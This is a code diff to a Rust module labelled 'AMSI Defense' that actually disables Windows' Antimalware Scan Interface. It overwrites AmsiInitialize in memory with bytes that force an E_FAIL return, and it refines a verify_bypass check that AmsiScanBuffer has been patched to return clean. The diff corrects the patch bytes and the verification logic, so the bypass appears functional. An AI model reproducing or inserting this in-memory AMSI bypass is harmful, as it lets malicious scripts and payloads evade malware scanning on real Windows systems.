@@ -1,6 +1,4 @@
 // AMSI Defense
-use std::ffi::c_void;
-
 #[cfg(windows)]
 use std::ptr;
 
@@ -127,17 +125,17 @@ fn set_init_failed_flag() {
             return;
         }
 
-        // AmsiInitialize is the entry point that sets up the context.
-        // Patch it to return E_FAIL (0x80004005) immediately.
+        // AmsiInitialize is __fastcall on x64; the caller cleans the stack so
+        // a single-byte RET (0xC3) is the correct return form.
         // mov eax, 0x80004005 ; ret  => B8 05 40 00 80 C3
         let init_fn = GetProcAddress(hmod, b"AmsiInitialize\0".as_ptr() as _);
         if init_fn.is_null() {
             return;
         }
 
-        let patch: [u8; 7] = [
+        let patch: [u8; 6] = [
             0xB8, 0x05, 0x40, 0x00, 0x80, // mov eax, 0x80004005 (E_FAIL)
-            0xC2, 0x00,                    // ret 0  (stdcall clean stack)
+            0xC3,                          // ret
         ];
         let mut old: u32 = 0;
         if VirtualProtect(init_fn as _, patch.len(), winapi::um::winnt::PAGE_EXECUTE_READWRITE, &mut old) != 0 {
@@ -166,14 +164,19 @@ pub fn verify_bypass() -> bool {
             return true;
         }
 
-        let bytes = std::slice::from_raw_parts(scan_buf as *const u8, 3);
-        // Check for xor eax,eax (0x31 0xC0) or xor eax,eax via 33 C0 variant
+        // Read 5 bytes so we can check the full mov eax,imm32 + ret form.
+        let bytes = std::slice::from_raw_parts(scan_buf as *const u8, 5);
+        // Patched forms:
+        //   31 C0 C3                 (xor eax,eax ; ret)
+        //   33 C0 C3                 (xor eax,eax alt encoding ; ret)
+        //   B8 00 00 00 00 + C3      (mov eax,0  ; ret) — 5 bytes shown here
         let patched = (bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
             || (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
-            || (bytes[0] == 0xB8 && bytes[2] == 0x00); // mov eax, 0 variant
+            || (bytes[0] == 0xB8 && bytes[1] == 0x00 && bytes[2] == 0x00 && bytes[3] == 0x00 && bytes[4] == 0x00);
 
         if !patched {
-            log::warn!("verify_bypass: AmsiScanBuffer does not appear patched (bytes: {:02x} {:02x} {:02x})", bytes[0], bytes[1], bytes[2]);
+            log::warn!("verify_bypass: AmsiScanBuffer does not appear patched (bytes: {:02x} {:02x} {:02x} {:02x} {:02x})",
+                bytes[0], bytes[1], bytes[2], bytes[3], bytes[4]);
         }
         patched
     }
